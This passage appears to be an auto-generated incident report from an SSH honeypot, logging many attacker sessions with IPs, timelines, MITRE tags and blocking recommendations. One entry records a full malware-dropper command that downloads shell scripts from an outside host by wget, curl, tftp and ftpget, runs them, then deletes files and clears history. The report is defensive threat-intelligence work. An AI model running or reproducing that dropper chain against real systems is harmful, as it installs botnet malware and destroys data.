| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:49:21` | `cowrie.session.connect` |
| `2026-06-25 15:49:21` | `cowrie.client.version` |
| `2026-06-25 15:49:21` | `cowrie.client.kex` |
| `2026-06-25 15:49:21` | `cowrie.login.success` |
| `2026-06-25 15:49:22` | `cowrie.session.params` |
| `2026-06-25 15:49:22` | `cowrie.command.input` |
| `2026-06-25 15:49:22` | `cowrie.log.closed` |
| `2026-06-25 15:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7074ac89c7

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 15:49 |
| **Last Seen** | 2026-06-25 15:49 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://51.158.248[.]122:8517/bins.sh; curl -O hxxp://51.158.248[.]122:8517/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.158.248[.]122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.158.248[.]122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.158.248[.]122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c` |
| **Download Attempts** | fxxp://anonymous:anonymous@51.158.248[.]122/ftp1.sh, fxxp://anonymous:anonymous@51.158.248[.]122/i686, fxxp://anonymous:anonymous@51.158.248[.]122/mips |
| **Malware Analysis** | f772dbf0e0b8bc9e935686d287f63b6577a7a08110350b745ff8e066cb753b8b (LOW), 494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984 (MEDIUM), 6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c (MEDIUM), 80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4 (MEDIUM), 59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530 (MEDIUM), 526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed (MEDIUM), d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b (MEDIUM), 2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995 (MEDIUM), 938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:49:33` | `cowrie.session.connect` |
| `2026-06-25 15:49:33` | `cowrie.login.success` |
| `2026-06-25 15:49:33` | `cowrie.session.params` |
| `2026-06-25 15:49:35` | `cowrie.command.input` |
| `2026-06-25 15:49:35` | `cowrie.command.input` |
| `2026-06-25 15:49:36` | `cowrie.session.file_download` |
| `2026-06-25 15:49:37` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:49:37` | `cowrie.session.file_download` |
| `2026-06-25 15:49:38` | `cowrie.session.file_download` |
| `2026-06-25 15:49:40` | `cowrie.session.file_download` |
| `2026-06-25 15:49:41` | `cowrie.session.file_download` |
| `2026-06-25 15:49:42` | `cowrie.session.file_download` |
| `2026-06-25 15:49:43` | `cowrie.session.file_download` |
| `2026-06-25 15:49:45` | `cowrie.session.file_download` |
| `2026-06-25 15:49:46` | `cowrie.session.file_download` |
| `2026-06-25 15:49:47` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:49:47` | `cowrie.session.file_download.failed` |
| `2026-06-25 15:49:50` | `cowrie.log.closed` |
| `2026-06-25 15:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30d994b7bb44

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:50 |
| **Last Seen** | 2026-06-25 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:50:24` | `cowrie.session.connect` |
| `2026-06-25 15:50:24` | `cowrie.client.version` |
| `2026-06-25 15:50:24` | `cowrie.client.kex` |
| `2026-06-25 15:50:24` | `cowrie.login.success` |
| `2026-06-25 15:50:25` | `cowrie.session.params` |
| `2026-06-25 15:50:25` | `cowrie.command.input` |
| `2026-06-25 15:50:25` | `cowrie.log.closed` |
| `2026-06-25 15:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f5e1cd40e9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 15:50 |
| **Last Seen** | 2026-06-25 15:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:50:51` | `cowrie.session.connect` |
| `2026-06-25 15:50:53` | `cowrie.client.version` |
| `2026-06-25 15:50:53` | `cowrie.client.kex` |
| `2026-06-25 15:50:59` | `cowrie.login.success` |
| `2026-06-25 15:51:03` | `cowrie.session.params` |
| `2026-06-25 15:51:03` | `cowrie.command.input` |
| `2026-06-25 15:51:05` | `cowrie.log.closed` |
| `2026-06-25 15:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da7e57765f6f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:51 |
| **Last Seen** | 2026-06-25 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:51:31` | `cowrie.session.connect` |
| `2026-06-25 15:51:31` | `cowrie.client.version` |
| `2026-06-25 15:51:31` | `cowrie.client.kex` |
| `2026-06-25 15:51:31` | `cowrie.login.success` |
| `2026-06-25 15:51:32` | `cowrie.session.params` |
| `2026-06-25 15:51:32` | `cowrie.command.input` |
| `2026-06-25 15:51:32` | `cowrie.log.closed` |
| `2026-06-25 15:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7aa31f526a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:52 |
| **Last Seen** | 2026-06-25 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:52:34` | `cowrie.session.connect` |
| `2026-06-25 15:52:34` | `cowrie.client.version` |
| `2026-06-25 15:52:34` | `cowrie.client.kex` |
| `2026-06-25 15:52:35` | `cowrie.login.success` |
| `2026-06-25 15:52:36` | `cowrie.session.params` |
| `2026-06-25 15:52:36` | `cowrie.command.input` |
| `2026-06-25 15:52:36` | `cowrie.log.closed` |
| `2026-06-25 15:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b6baa4d2643

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:53 |
| **Last Seen** | 2026-06-25 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:53:43` | `cowrie.session.connect` |
| `2026-06-25 15:53:43` | `cowrie.client.version` |
| `2026-06-25 15:53:43` | `cowrie.client.kex` |
| `2026-06-25 15:53:43` | `cowrie.login.success` |
| `2026-06-25 15:53:44` | `cowrie.session.params` |
| `2026-06-25 15:53:44` | `cowrie.command.input` |
| `2026-06-25 15:53:44` | `cowrie.log.closed` |
| `2026-06-25 15:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c716fd2f5a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:54 |
| **Last Seen** | 2026-06-25 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:54:46` | `cowrie.session.connect` |
| `2026-06-25 15:54:46` | `cowrie.client.version` |
| `2026-06-25 15:54:46` | `cowrie.client.kex` |
| `2026-06-25 15:54:46` | `cowrie.login.success` |
| `2026-06-25 15:54:47` | `cowrie.session.params` |
| `2026-06-25 15:54:47` | `cowrie.command.input` |
| `2026-06-25 15:54:47` | `cowrie.log.closed` |
| `2026-06-25 15:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7599292b2d2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 15:55 |
| **Last Seen** | 2026-06-25 15:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:55:09` | `cowrie.session.connect` |
| `2026-06-25 15:55:09` | `cowrie.client.version` |
| `2026-06-25 15:55:09` | `cowrie.client.kex` |
| `2026-06-25 15:55:11` | `cowrie.login.success` |
| `2026-06-25 15:55:13` | `cowrie.session.params` |
| `2026-06-25 15:55:13` | `cowrie.command.input` |
| `2026-06-25 15:55:13` | `cowrie.log.closed` |
| `2026-06-25 15:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-022dd1d4504a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:55 |
| **Last Seen** | 2026-06-25 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:55:52` | `cowrie.session.connect` |
| `2026-06-25 15:55:52` | `cowrie.client.version` |
| `2026-06-25 15:55:52` | `cowrie.client.kex` |
| `2026-06-25 15:55:53` | `cowrie.login.success` |
| `2026-06-25 15:55:53` | `cowrie.session.params` |
| `2026-06-25 15:55:53` | `cowrie.command.input` |
| `2026-06-25 15:55:53` | `cowrie.log.closed` |
| `2026-06-25 15:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945b2123c233

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-06-25 15:56 |
| **Last Seen** | 2026-06-25 15:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, busybox TEST, cat /proc, /` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:56:05` | `cowrie.session.connect` |
| `2026-06-25 15:56:06` | `cowrie.login.success` |
| `2026-06-25 15:56:06` | `cowrie.session.params` |
| `2026-06-25 15:56:07` | `cowrie.command.input` |
| `2026-06-25 15:56:08` | `cowrie.command.input` |
| `2026-06-25 15:56:09` | `cowrie.command.input` |
| `2026-06-25 15:56:09` | `cowrie.command.input` |
| `2026-06-25 15:56:09` | `cowrie.log.closed` |
| `2026-06-25 15:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f1fcf4a91a4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:57 |
| **Last Seen** | 2026-06-25 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:57:05` | `cowrie.session.connect` |
| `2026-06-25 15:57:05` | `cowrie.client.version` |
| `2026-06-25 15:57:05` | `cowrie.client.kex` |
| `2026-06-25 15:57:05` | `cowrie.login.success` |
| `2026-06-25 15:57:06` | `cowrie.session.params` |
| `2026-06-25 15:57:06` | `cowrie.command.input` |
| `2026-06-25 15:57:06` | `cowrie.log.closed` |
| `2026-06-25 15:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf3db1723d5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:58 |
| **Last Seen** | 2026-06-25 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:58:09` | `cowrie.session.connect` |
| `2026-06-25 15:58:09` | `cowrie.client.version` |
| `2026-06-25 15:58:09` | `cowrie.client.kex` |
| `2026-06-25 15:58:09` | `cowrie.login.success` |
| `2026-06-25 15:58:10` | `cowrie.session.params` |
| `2026-06-25 15:58:10` | `cowrie.command.input` |
| `2026-06-25 15:58:10` | `cowrie.log.closed` |
| `2026-06-25 15:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78b0b40dc253

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:59 |
| **Last Seen** | 2026-06-25 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:59:12` | `cowrie.session.connect` |
| `2026-06-25 15:59:12` | `cowrie.client.version` |
| `2026-06-25 15:59:12` | `cowrie.client.kex` |
| `2026-06-25 15:59:13` | `cowrie.login.success` |
| `2026-06-25 15:59:13` | `cowrie.session.params` |
| `2026-06-25 15:59:13` | `cowrie.command.input` |
| `2026-06-25 15:59:14` | `cowrie.log.closed` |
| `2026-06-25 15:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0259c9bf9fa9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:00 |
| **Last Seen** | 2026-06-25 16:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:00:21` | `cowrie.session.connect` |
| `2026-06-25 16:00:21` | `cowrie.client.version` |
| `2026-06-25 16:00:21` | `cowrie.client.kex` |
| `2026-06-25 16:00:22` | `cowrie.login.success` |
| `2026-06-25 16:00:23` | `cowrie.session.params` |
| `2026-06-25 16:00:23` | `cowrie.command.input` |
| `2026-06-25 16:00:23` | `cowrie.log.closed` |
| `2026-06-25 16:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c398e1d952e4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:01 |
| **Last Seen** | 2026-06-25 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:01:07` | `cowrie.session.connect` |
| `2026-06-25 16:01:07` | `cowrie.client.version` |
| `2026-06-25 16:01:07` | `cowrie.client.kex` |
| `2026-06-25 16:01:07` | `cowrie.login.success` |
| `2026-06-25 16:01:08` | `cowrie.session.params` |
| `2026-06-25 16:01:08` | `cowrie.command.input` |
| `2026-06-25 16:01:08` | `cowrie.log.closed` |
| `2026-06-25 16:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c09a26197455

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 16:01 |
| **Last Seen** | 2026-06-25 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:01:43` | `cowrie.session.connect` |
| `2026-06-25 16:01:43` | `cowrie.client.version` |
| `2026-06-25 16:01:43` | `cowrie.client.kex` |
| `2026-06-25 16:01:44` | `cowrie.login.success` |
| `2026-06-25 16:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576c36f1d5e4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 16:01 |
| **Last Seen** | 2026-06-25 16:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:01:44` | `cowrie.session.connect` |
| `2026-06-25 16:01:44` | `cowrie.client.version` |
| `2026-06-25 16:01:45` | `cowrie.client.kex` |
| `2026-06-25 16:01:45` | `cowrie.login.success` |
| `2026-06-25 16:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15daba5be5c1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 16:01 |
| **Last Seen** | 2026-06-25 16:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:01:52` | `cowrie.session.connect` |
| `2026-06-25 16:01:52` | `cowrie.client.version` |
| `2026-06-25 16:01:52` | `cowrie.client.kex` |
| `2026-06-25 16:01:52` | `cowrie.login.success` |
| `2026-06-25 16:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4343fc402270

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 16:01 |
| **Last Seen** | 2026-06-25 16:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:01:53` | `cowrie.session.connect` |
| `2026-06-25 16:01:53` | `cowrie.client.version` |
| `2026-06-25 16:01:53` | `cowrie.client.kex` |
| `2026-06-25 16:01:53` | `cowrie.login.success` |
| `2026-06-25 16:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c077bc5ad95

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:01 |
| **Last Seen** | 2026-06-25 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:01:57` | `cowrie.session.connect` |
| `2026-06-25 16:01:57` | `cowrie.client.version` |
| `2026-06-25 16:01:57` | `cowrie.client.kex` |
| `2026-06-25 16:01:57` | `cowrie.login.success` |
| `2026-06-25 16:01:58` | `cowrie.session.params` |
| `2026-06-25 16:01:58` | `cowrie.command.input` |
| `2026-06-25 16:01:58` | `cowrie.log.closed` |
| `2026-06-25 16:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f59b85180cd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:02 |
| **Last Seen** | 2026-06-25 16:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:02:49` | `cowrie.session.connect` |
| `2026-06-25 16:02:49` | `cowrie.client.version` |
| `2026-06-25 16:02:49` | `cowrie.client.kex` |
| `2026-06-25 16:02:50` | `cowrie.login.success` |
| `2026-06-25 16:02:51` | `cowrie.session.params` |
| `2026-06-25 16:02:51` | `cowrie.command.input` |
| `2026-06-25 16:02:51` | `cowrie.log.closed` |
| `2026-06-25 16:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d8a132912a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:03 |
| **Last Seen** | 2026-06-25 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:03:37` | `cowrie.session.connect` |
| `2026-06-25 16:03:37` | `cowrie.client.version` |
| `2026-06-25 16:03:37` | `cowrie.client.kex` |
| `2026-06-25 16:03:37` | `cowrie.login.success` |
| `2026-06-25 16:03:38` | `cowrie.session.params` |
| `2026-06-25 16:03:38` | `cowrie.command.input` |
| `2026-06-25 16:03:38` | `cowrie.log.closed` |
| `2026-06-25 16:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e32f40d1b15a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:04 |
| **Last Seen** | 2026-06-25 16:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:04:20` | `cowrie.session.connect` |
| `2026-06-25 16:04:20` | `cowrie.client.version` |
| `2026-06-25 16:04:20` | `cowrie.client.kex` |
| `2026-06-25 16:04:20` | `cowrie.login.success` |
| `2026-06-25 16:04:21` | `cowrie.session.params` |
| `2026-06-25 16:04:21` | `cowrie.command.input` |
| `2026-06-25 16:04:21` | `cowrie.log.closed` |
| `2026-06-25 16:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48ce980b7f4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:05 |
| **Last Seen** | 2026-06-25 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:05:03` | `cowrie.session.connect` |
| `2026-06-25 16:05:03` | `cowrie.client.version` |
| `2026-06-25 16:05:03` | `cowrie.client.kex` |
